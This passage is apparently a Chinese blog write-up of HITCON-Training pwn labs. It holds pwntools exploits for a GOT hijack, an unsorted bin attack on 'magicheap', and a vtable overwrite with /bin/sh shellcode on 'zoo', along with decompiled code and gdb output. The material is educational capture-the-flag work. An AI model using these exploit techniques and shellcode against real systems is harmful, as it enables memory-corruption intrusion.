class=\"number\">-6</span>:].ljust(<span class=\"number\">8</span>, <span class=\"string\">\"\\x00\"</span>))</span><br><span class=\"line\">libc_base = addr - libc.symbols[<span class=\"string\">'atoi'</span>]</span><br><span class=\"line\">one_gadget = <span class=\"number\">0xf1147</span> + libc_base</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># hijack got</span></span><br><span class=\"line\">edit(<span class=\"number\">1</span>, p64(one_gadget))</span><br><span class=\"line\"></span><br><span class=\"line\">p.sendline(<span class=\"string\">\"pwnit\"</span>)</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n<h2 id=\"Lab14——magicheap\"><a href=\"#Lab14——magicheap\" class=\"headerlink\" title=\"Lab14——magicheap\"></a>Lab14——magicheap</h2><h3 id=\"防护-4\"><a href=\"#防护-4\" class=\"headerlink\" title=\"防护\"></a>防护</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">liwc@ubuntu:~/pwn/HITCON-Training/LAB/lab14$ checksec magicheap</span><br><span class=\"line\">[*] &apos;/home/liwc/pwn/HITCON-Training/LAB/lab14/magicheap&apos;</span><br><span class=\"line\">    Arch:     amd64-64-little</span><br><span class=\"line\">    RELRO:    Partial RELRO</span><br><span class=\"line\">    Stack:    Canary found</span><br><span class=\"line\">    NX:       NX enabled</span><br><span class=\"line\">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>\n<h3 id=\"分析-4\"><a href=\"#分析-4\" class=\"headerlink\" title=\"分析\"></a>分析</h3><p>还是增删改查。</p>\n<p>当输入4869时，若全局变量magic &gt; 0x1305，则直接cat flag。</p>\n<p>漏洞存在于edit功能中，存在一个任意长度的堆溢出。</p>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">unsigned</span> __<span class=\"function\">int64 <span class=\"title\">edit_heap</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">size_t</span> v0; <span class=\"comment\">// ST08_8</span></span><br><span class=\"line\">  <span class=\"keyword\">int</span> v2; <span class=\"comment\">// [rsp+4h] [rbp-1Ch]</span></span><br><span class=\"line\">  <span class=\"keyword\">char</span> buf; <span class=\"comment\">// [rsp+10h] [rbp-10h]</span></span><br><span class=\"line\">  <span class=\"keyword\">unsigned</span> __int64 v4; <span class=\"comment\">// [rsp+18h] [rbp-8h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  v4 = __readfsqword(<span class=\"number\">0x28</span>u);</span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">\"Index :\"</span>);</span><br><span class=\"line\">  read(<span class=\"number\">0</span>, &amp;buf, <span class=\"number\">4u</span>LL);</span><br><span class=\"line\">  v2 = atoi(&amp;buf);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( v2 &lt; <span class=\"number\">0</span> || v2 &gt; <span class=\"number\">9</span> )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">\"Out of bound!\"</span>);</span><br><span class=\"line\">    _exit(<span class=\"number\">0</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( heaparray[v2] )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">\"Size of Heap : \"</span>, &amp;buf);</span><br><span class=\"line\">    read(<span class=\"number\">0</span>, &amp;buf, <span class=\"number\">8u</span>LL);</span><br><span class=\"line\">    v0 = atoi(&amp;buf);</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">\"Content of heap : \"</span>, &amp;buf);</span><br><span class=\"line\">    read_input(heaparray[v2], v0);</span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">\"Done !\"</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">else</span></span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">\"No such heap !\"</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> __readfsqword(<span class=\"number\">0x28</span>u) ^ v4;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>我们需要利用这个堆溢出漏洞，完成bss段修改的需求。最容易想到的方法应该是直接构造unlink利用。</p>\n<p>该题由于提示用unsorted bin attack，unsorted bin attack的利用效果是将任意地址的数修改为一个很大的数，看起来似乎没有什么用，但也至少有如下两个利用场景：</p>\n<ul>\n<li>我们通过修改循环的次数来使得程序可以执行多次循环。</li>\n<li>我们可以修改 heap 中的 global_max_fast 来使得更大的 chunk 可以被视为 fast bin，这样我们就可以去执行一些 fast bin attack 了。</li>\n</ul>\n<p>具体的原理可以去CTF Wiki上看（<a href=\"https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/unsorted_bin_attack/\" target=\"_blank\" rel=\"noopener\">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/unsorted_bin_attack/</a>）</p>\n<p>我们使用堆溢出，修改相邻的位于unsorted bin中的chunk的bk字段，指向我们想要修改的地址 - 0x10。由于unsorted bin是FIFO，我们只需要malloc一次，就能将目标地址的数修改为main_arena+offset的地址，即一个远远大于0x1305的数，也就实现了利用。</p>\n<p>exp如下：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"comment\"># from LibcSearcher import *</span></span><br><span class=\"line\"></span><br><span class=\"line\">libc = ELF(<span class=\"string\">\"/lib/x86_64-linux-gnu/libc.so.6\"</span>)</span><br><span class=\"line\">context.log_level = <span class=\"string\">\"debug\"</span></span><br><span class=\"line\">elf = ELF(<span class=\"string\">\"./magicheap\"</span>)</span><br><span class=\"line\">p = process(<span class=\"string\">\"./magicheap\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">create</span><span class=\"params\">(size, content)</span>:</span></span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"choice :\"</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"string\">\"1\"</span>)</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"Heap : \"</span>)</span><br><span class=\"line\">\tp.sendline(str(size))</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"heap:\"</span>)</span><br><span class=\"line\">\tp.send(content)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">edit</span><span class=\"params\">(index, size, content)</span>:</span></span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"choice :\"</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"string\">\"2\"</span>)</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"Index :\"</span>)</span><br><span class=\"line\">\tp.sendline(str(index))</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"Heap : \"</span>)</span><br><span class=\"line\">\tp.sendline(str(size))</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"heap : \"</span>)</span><br><span class=\"line\">\tp.sendline(content)</span><br><span class=\"line\">\tp.send(content)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">delete</span><span class=\"params\">(index)</span>:</span></span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"choice :\"</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"string\">\"3\"</span>)</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"Index :\"</span>)</span><br><span class=\"line\">\tp.sendline(str(index))</span><br><span class=\"line\"></span><br><span class=\"line\">create(<span class=\"number\">0x10</span>, <span class=\"string\">\"a\"</span>)</span><br><span class=\"line\">create(<span class=\"number\">0x80</span>, <span class=\"string\">\"b\"</span>)</span><br><span class=\"line\">create(<span class=\"number\">0x10</span>, <span class=\"string\">\"c\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">delete(<span class=\"number\">1</span>)</span><br><span class=\"line\">addr = <span class=\"number\">0x6020c0</span> - <span class=\"number\">0x10</span></span><br><span class=\"line\">payload = <span class=\"string\">\"a\"</span> * <span class=\"number\">0x10</span> + p64(<span class=\"number\">0x20</span>) + p64(<span class=\"number\">0x91</span>) + <span class=\"string\">\"aaaaaaaa\"</span> + p64(addr)</span><br><span class=\"line\">edit(<span class=\"number\">0</span>, len(payload), payload)</span><br><span class=\"line\">create(<span class=\"number\">0x80</span>, <span class=\"string\">\"d\"</span>) </span><br><span class=\"line\"></span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n<h2 id=\"Lab15——zoo\"><a href=\"#Lab15——zoo\" class=\"headerlink\" title=\"Lab15——zoo\"></a>Lab15——zoo</h2><h3 id=\"防护-5\"><a href=\"#防护-5\" class=\"headerlink\" title=\"防护\"></a>防护</h3><p>该题没有开启NX和PIE，只有canary。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">liwc@ubuntu:~/pwn/HITCON-Training/LAB/lab15$ checksec zoo</span><br><span class=\"line\">[*] &apos;/home/liwc/pwn/HITCON-Training/LAB/lab15/zoo&apos;</span><br><span class=\"line\">    Arch:     amd64-64-little</span><br><span class=\"line\">    RELRO:    Partial RELRO</span><br><span class=\"line\">    Stack:    Canary found</span><br><span class=\"line\">    NX:       NX disabled</span><br><span class=\"line\">    PIE:      No PIE (0x400000)</span><br><span class=\"line\">    RWX:      Has RWX segments</span><br></pre></td></tr></table></figure>\n<h3 id=\"分析-5\"><a href=\"#分析-5\" class=\"headerlink\" title=\"分析\"></a>分析</h3><p>该题是C++编写的。首先会读入0x64bytes到全局变量nameofzoo。</p>\n<h4 id=\"adddog\"><a href=\"#adddog\" class=\"headerlink\" title=\"adddog\"></a>adddog</h4><p>要求输入name和weight，然后new一个0x28的dog对象，调用构造函数初始化，然后向animallist这个vector中插入当前dog对象。</p>\n<p>逆向可得Dog类的结构如下：有两个成员函数和两个成员变量，存储name和weight。</p>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Dog</span> :</span> Animal&#123;</span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">speak</span><span class=\"params\">()</span></span>;</span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">info</span><span class=\"params\">()</span></span>;</span><br><span class=\"line\">\t<span class=\"keyword\">char</span> name[<span class=\"number\">24</span>];<span class=\"comment\">// + 8</span></span><br><span class=\"line\">\t<span class=\"keyword\">long</span> weight; <span class=\"comment\">// + 32</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>其中成员函数指向rodata段的vtable。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.rodata:0000000000403130 `vtable for&apos;Dog dq 0                    ; offset to this</span><br><span class=\"line\">.rodata:0000000000403138                 dq offset `typeinfo for&apos;Dog</span><br><span class=\"line\">.rodata:0000000000403140 off_403140      dq offset Dog::speak(void)</span><br><span class=\"line\">.rodata:0000000000403140                                         ; DATA XREF: Dog::Dog(std::__cxx11::basic_string&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;,int)+1F↑o</span><br><span class=\"line\">.rodata:0000000000403148                 dq offset Dog::info(void)</span><br><span class=\"line\">.rodata:0000000000403150                 public `vtable for&apos;Animal ; weak</span><br></pre></td></tr></table></figure>\n<p>Dog的构造函数中存在堆溢出漏洞，由于直接使用strcpy。</p>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">unsigned</span> __<span class=\"function\">int64 <span class=\"title\">adddog</span><span class=\"params\">(<span class=\"keyword\">void</span>)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">  __int64 dog; <span class=\"comment\">// rbx</span></span><br><span class=\"line\">  <span class=\"keyword\">int</span> weight; <span class=\"comment\">// [rsp+Ch] [rbp-74h]</span></span><br><span class=\"line\">  __int64 v3; <span class=\"comment\">// [rsp+10h] [rbp-70h]</span></span><br><span class=\"line\">  __int64 v4; <span class=\"comment\">// [rsp+18h] [rbp-68h]</span></span><br><span class=\"line\">  <span class=\"keyword\">char</span> v5; <span class=\"comment\">// [rsp+20h] [rbp-60h]</span></span><br><span class=\"line\">  <span class=\"keyword\">char</span> name; <span class=\"comment\">// [rsp+40h] [rbp-40h]</span></span><br><span class=\"line\">  <span class=\"keyword\">unsigned</span> __int64 v7; <span class=\"comment\">// [rsp+68h] [rbp-18h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  v7 = __readfsqword(<span class=\"number\">0x28</span>u);</span><br><span class=\"line\">  <span class=\"built_in\">std</span>::__cxx11::basic_string&lt;<span class=\"keyword\">char</span>,<span class=\"built_in\">std</span>::char_traits&lt;<span class=\"keyword\">char</span>&gt;,<span class=\"built_in\">std</span>::allocator&lt;<span class=\"keyword\">char</span>&gt;&gt;::basic_string(&amp;v5);</span><br><span class=\"line\">  <span class=\"built_in\">std</span>::<span class=\"keyword\">operator</span>&lt;&lt;&lt;<span class=\"built_in\">std</span>::char_traits&lt;<span class=\"keyword\">char</span>&gt;&gt;(&amp;<span class=\"built_in\">std</span>::<span class=\"built_in\">cout</span>, <span class=\"string\">\"Name : \"</span>);</span><br><span class=\"line\">  <span class=\"built_in\">std</span>::<span class=\"keyword\">operator</span>&gt;&gt;&lt;<span class=\"keyword\">char</span>,<span class=\"built_in\">std</span>::char_traits&lt;<span class=\"keyword\">char</span>&gt;,<span class=\"built_in\">std</span>::allocator&lt;<span class=\"keyword\">char</span>&gt;&gt;(&amp;edata, &amp;v5);</span><br><span class=\"line\">  <span class=\"built_in\">std</span>::<span class=\"keyword\">operator</span>&lt;&lt;&lt;<span class=\"built_in\">std</span>::char_traits&lt;<span class=\"keyword\">char</span>&gt;&gt;(&amp;<span class=\"built_in\">std</span>::<span class=\"built_in\">cout</span>, <span class=\"string\">\"Weight : \"</span>);</span><br><span class=\"line\">  <span class=\"built_in\">std</span>::istream::<span class=\"keyword\">operator</span>&gt;&gt;(&amp;edata, &amp;weight);</span><br><span class=\"line\">  <span class=\"built_in\">std</span>::__cxx11::basic_string&lt;<span class=\"keyword\">char</span>,<span class=\"built_in\">std</span>::char_traits&lt;<span class=\"keyword\">char</span>&gt;,<span class=\"built_in\">std</span>::allocator&lt;<span class=\"keyword\">char</span>&gt;&gt;::basic_string(&amp;name, &amp;v5);</span><br><span class=\"line\">  dog = <span class=\"keyword\">operator</span> <span class=\"keyword\">new</span>(<span class=\"number\">0x28</span>uLL);</span><br><span class=\"line\">  Dog::Dog(dog, (__int64)&amp;name, weight);</span><br><span class=\"line\">  v4 = dog;</span><br><span class=\"line\">  <span class=\"built_in\">std</span>::__cxx11::basic_string&lt;<span class=\"keyword\">char</span>,<span class=\"built_in\">std</span>::char_traits&lt;<span class=\"keyword\">char</span>&gt;,<span class=\"built_in\">std</span>::allocator&lt;<span class=\"keyword\">char</span>&gt;&gt;::~basic_string(&amp;name);</span><br><span class=\"line\">  v3 = v4;</span><br><span class=\"line\">  <span class=\"built_in\">std</span>::<span class=\"built_in\">vector</span>&lt;Animal *,<span class=\"built_in\">std</span>::allocator&lt;Animal *&gt;&gt;::push_back(&amp;animallist, &amp;v3);</span><br><span class=\"line\">  <span class=\"built_in\">std</span>::__cxx11::basic_string&lt;<span class=\"keyword\">char</span>,<span class=\"built_in\">std</span>::char_traits&lt;<span class=\"keyword\">char</span>&gt;,<span class=\"built_in\">std</span>::allocator&lt;<span class=\"keyword\">char</span>&gt;&gt;::~basic_string(&amp;v5);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> __readfsqword(<span class=\"number\">0x28</span>u) ^ v7;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h4 id=\"addcat\"><a href=\"#addcat\" class=\"headerlink\" title=\"addcat\"></a>addcat</h4><p>和adddog完全一样，只不过new的是cat对象，同样push_back到animallist中。</p>\n<h4 id=\"listen\"><a href=\"#listen\" class=\"headerlink\" title=\"listen\"></a>listen</h4><p>首先检查animallist的size是否为0，是则直接退出。然后若index合法，则直接调用相应animal的speak函数。这里不难想到，如果我们可以劫持vtable，也就可以劫持控制流了。</p>\n<h4 id=\"show-1\"><a href=\"#show-1\" class=\"headerlink\" title=\"show\"></a>show</h4><p>同上，也是调用对象的成员函数。打印出对象的name和info字段。</p>\n<h4 id=\"remove\"><a href=\"#remove\" class=\"headerlink\" title=\"remove\"></a>remove</h4><p>首先delete掉animallist上对应index的对象，然后erase掉vector上相应项。</p>\n<h3 id=\"利用-4\"><a href=\"#利用-4\" class=\"headerlink\" title=\"利用\"></a>利用</h3><p>这里主要的难点是获取覆盖虚表指针的偏移，可以用gdb调试获得。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">gef➤  x/32gx 0x0000000001263c20</span><br><span class=\"line\">0x1263c20:\t0x0000000000403140\t0x0000000031676f64</span><br><span class=\"line\">0x1263c30:\t0x0000000000000000\t0x0000000000000000</span><br><span class=\"line\">0x1263c40:\t0x0000000000000028\t0x0000000000000021</span><br><span class=\"line\">0x1263c50:\t0x0000000000000000\t0x0000000000000000</span><br><span class=\"line\">0x1263c60:\t0x0000000000000000\t0x0000000000000031</span><br><span class=\"line\">0x1263c70:\t0x0000000000403140\t0x0000000032676f64</span><br><span class=\"line\">0x1263c80:\t0x0000000000000000\t0x0000000000000000</span><br><span class=\"line\">0x1263c90:\t0x0000000000000028\t0x0000000000000021</span><br><span class=\"line\">0x1263ca0:\t0x0000000001263c20\t0x0000000001263c70</span><br><span class=\"line\">0x1263cb0:\t0x0000000000000000\t0x0000000000020351</span><br><span class=\"line\">0x1263cc0:\t0x0000000000000000\t0x0000000000000000</span><br><span class=\"line\">0x1263cd0:\t0x0000000000000000\t0x0000000000000000</span><br><span class=\"line\">0x1263ce0:\t0x0000000000000000\t0x0000000000000000</span><br><span class=\"line\">0x1263cf0:\t0x0000000000000000\t0x0000000000000000</span><br><span class=\"line\">0x1263d00:\t0x0000000000000000\t0x0000000000000000</span><br><span class=\"line\">0x1263d10:\t0x0000000000000000\t0x0000000000000000</span><br></pre></td></tr></table></figure>\n<p>可以看到0x1263c70处是要覆盖的虚表地址，而我们是从0x1263c28处开始写，所以需要padding 9 * 0x8 bytes。</p>\n<p>直接在读入zooname时在bss段布置好shellcode和fake vtable，最后直接覆盖vtable即可。</p>\n<p>完整exp如下：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"comment\"># from LibcSearcher import *</span></span><br><span class=\"line\"></span><br><span class=\"line\">libc = ELF(<span class=\"string\">\"/lib/x86_64-linux-gnu/libc.so.6\"</span>)</span><br><span class=\"line\">context.log_level = <span class=\"string\">\"debug\"</span></span><br><span class=\"line\">elf = ELF(<span class=\"string\">\"./zoo\"</span>)</span><br><span class=\"line\">p = process(<span class=\"string\">\"./zoo\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">adddog</span><span class=\"params\">(name, weight)</span>:</span></span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"choice :\"</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"string\">\"1\"</span>)</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"Name : \"</span>)</span><br><span class=\"line\">\tp.sendline(name)</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"Weight : \"</span>)</span><br><span class=\"line\">\tp.sendline(str(weight))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">addcat</span><span class=\"params\">(name, weight)</span>:</span></span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"choice :\"</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"string\">\"2\"</span>)</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"Name : \"</span>)</span><br><span class=\"line\">\tp.sendline(name)</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"Weight : \"</span>)</span><br><span class=\"line\">\tp.sendline(str(weight))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">listen</span><span class=\"params\">(index)</span>:</span></span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"choice :\"</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"string\">\"3\"</span>)</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"animal : \"</span>)</span><br><span class=\"line\">\tp.sendline(str(index))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">show</span><span class=\"params\">(index)</span>:</span></span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"choice :\"</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"string\">\"4\"</span>)</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"animal : \"</span>)</span><br><span class=\"line\">\tp.sendline(str(index))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">remove</span><span class=\"params\">(index)</span>:</span></span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"choice :\"</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"string\">\"5\"</span>)</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"animal : \"</span>)</span><br><span class=\"line\">\tp.sendline(str(index))</span><br><span class=\"line\">shellcode = <span class=\"string\">\"\\x31\\xf6\\x48\\xbb\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x56\\x53\\x54\\x5f\\x6a\\x3b\\x58\\x31\\xd2\\x0f\\x05\"</span></span><br><span class=\"line\"></span><br><span class=\"line\">p.sendafter(<span class=\"string\">\"Name of Your zoo :\"</span>, shellcode + p64(<span class=\"number\">0x605420</span>))</span><br><span class=\"line\"></span><br><span class=\"line\">adddog(<span class=\"string\">\"dog1\"</span>, <span class=\"number\">40</span>)</span><br><span class=\"line\">adddog(<span class=\"string\">\"dog2\"</span>, <span class=\"number\">40</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">remove(<span class=\"number\">0</span>)</span><br><span class=\"line\">adddog(<span class=\"string\">\"a\"</span> * <span class=\"number\">0x8</span> * <span class=\"number\">9</span> + p64(<span class=\"number\">0x605420</span> + len(shellcode)),<span class=\"number\">40</span>)</span><br><span class=\"line\">listen(<span class=\"number\">0</span>)</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n","text":"Lab10——hacknote防护可以看到本题开启了canary和nx，这时想在栈上进行利用就相当困难了。1<br>2<br>3<br>4<br>5<br>6<br>7<br>liwc@ubuntu:~/pwn/HITCON-Training/LAB/lab10$ checkse","link":"","raw":null,"photos":[],"categories":[],"tags":[{"name":"pwn","slug":"pwn","count":5,"path":"api/tags/pwn.json"}]},{"title":"HITCON_training题解(一)","slug":"HITCON-training-1","date":"2019-04-10T06:47:42.000Z","updated":"2019-04-10T06:58:02.000Z","comments":true,"path":"api/articles/HITCON-training-1.json","excerpt":"","keywords":null,"cover":null,"content":"<h2 id=\"Lab1——sysmagic\"><a href=\"#Lab1——sysmagic\" class=\"headerlink\" 